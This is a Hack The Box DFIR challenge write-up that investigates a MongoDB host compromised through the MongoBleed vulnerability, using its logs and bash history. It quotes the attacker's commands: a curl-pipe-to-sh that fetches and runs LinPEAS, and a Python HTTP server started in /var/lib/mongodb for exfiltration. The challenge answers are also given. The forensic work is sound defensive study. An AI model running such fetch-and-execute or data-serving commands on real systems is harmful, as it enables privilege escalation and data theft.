---
title: "HTB DFIR Sherlock: MangoBleed"
type: "posts"
author: WildPasta
author_url: "https://medium.com/@wildpasta"
published: 2026-02-20
source: Medium
toc: false
categories: ["writeups"]
tags: ["hackthebox", "dfir", "writeups"]
---

# HTB DFIR Sherlock: MangoBleed

We’re provided with a dump of a host named _mongodbsync_. It was affected by a high criticity vulnerability on **MongoDB** and our job is to find what happened on the compromised host. The collector used was [UAC](https://github.com/tclahr/uac) which is a famous tool used in forensic incident response.

---

> Task 1: What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

By searching MongoBleed on our web browser, the CVE ID easily stands out to be **CVE-2025–14847**.

{{< style "height:2rem;" >}}{{< /style >}}
> Task 2: What is the version of MongoDB installed on the server that the CVE exploited?

When a package is installed on Linux, it gets indexed into the database located in `/var/lib/dpkg`. The specific version of each packages are listed in `/var/lib/dpkg/status_file`. In our case, installed **MongoDB-org** package is: **8.0.16**. This version is indeed affected by MongoBleed CVE (patched as of 8.0.17).

{{< image src="images/MongoDB_package_version_from__var_lib_dp_9420.png" alt="MongoDB package version from /var/lib/dpkg/status" caption="Installed MongoDB version" >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 3: Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.

Reading about that vulnerability, we learn that in order to achieve the heap memory disclosure, the attacker has to send a custom OP_COMPRESSED message. Also, suspicious indicator may be :

- Repeated connections from same IP
- Rapid connect/disconnect pattern
- Very short-lived sessions

We have numerous connections in our _/var/log/mongodb/mongod.log_ that came from the same IP and that checks out the two other points of our list: **65.0.76.43**.

{{< image src="images/Snippet_from__var_log_mongodb_mongod_log_9267.png" alt="Snippet from /var/log/mongodb/mongod.log" caption="Spotted attacker IP in /var/log/mongodb/mongod.log" >}}

It can be confirmed by checking the SSH _auth.log_. Indeed, multiple connection failure from the found IP were logged, eventually followed by a success, which looks like a bruteforce attack.

{{< image src="images/Snippet_from__var_log_auth_log_2951.png" alt="Snippet from /var/log/auth.log" caption="Spotted attacker IP in /var/log/auth.log" >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 4: Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event).

By reading the _/var/log/mongodb/mongod.log_ and correlate the first _Connection Accepted_ message with our attacker known IP, we can safely assume that the attack started on the: **2025–12–29 05:25:52**.

```
# first Connection Accepted event (l.182 in /var/log/mongodb/mongod.log)
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
```

{{< style "height:2rem;" >}}{{< /style >}}
> Task 5: Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

Still focusing on our _/var/log/mongodb/mongod.log_, we can simply count the connection issued from our attacker IP using a short regular expression:

```bash
grep -E "connection (accepted|ended).*65\.0\.76\.43" mongod.log | wc -l
```

It needed a bit of messing around because “connections initiated” was referring to “connection accepted” and “connection ended”. But still, the output of the command line is: **75260**.

{{< style "height:2rem;" >}}{{< /style >}}
> Task 6: The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

Based on `/var/log/auth.log` we can follow-up our investigation on SSH bruteforce that is probably the “interactive hands-on access”. The log show a successful connection from our attacker IP on 2025–12–29 05:39:24. However, it is followed by 10 other “Authentication failure”, probably meaning that the bruteforce tool was configured to **continue on success**, so it had to exhaust its passwords list before stopping.

{{< image src="images/Snippet_from__var_log_auth_log_4678.png" alt="Snippet from /var/log/auth.log" caption="Successful bruteforce (source: l.182 in /var/log/auth.log )" >}}

The first interactive logon of our attacker is the one following the bruteforce attempt. It connected successfully on: **2025–12–29 05:40:03**.

{{< image src="images/First_manual_logon_from_attacker__source_3690.png" alt="First manual logon from attacker (source: l.207 in /var/log/auth.log)" caption="First manual logon from attacker (source: l.207 in /var/log/auth.log)" >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

For this step, we have to look in the bash history of the mongoadmin user (located in _/home/mongoadmin/.bash_history_). We can find a suspicious line related to LinPEAS, a well-known LPE script for Linux:

```bash
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
```

The flag is **the full curl command** that is leading to a LinPEAS scan of the host.

{{< style "height:2rem;" >}}{{< /style >}}
> Task 8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

On the _.bash_history_ file of our _mongoadmin_ user, we find the python server mentioned in the question:

```bash
cd /var/lib/mongodb/
[SNIP]
python3
python3 -m http.server 6969
exit
```

It is a basic exfiltration technique that serve the files in the current working directory on a HTTP server (started here on port 6969 - naughty boy). So the targeted directory is: **/var/lib/mongodb**.

---

Hope this short write-up helped you understand better how host compromised by MongoBleed vulnerability can be investigated. The process here was done manually step by step but if you’d like enterprise level DFIR for this exploit, you should get your hands on [Neo23x0 dedicated tool](https://github.com/Neo23x0/mongobleed-detector).

_NB: My write-up are written by myself, without any AI assistance. Excuse my poor english, I chose to share raw content._

{{< image src="images/MongoBleed_success_banner_4124.png" alt="MongoBleed success banner" caption="MongoBleed success banner" >}}
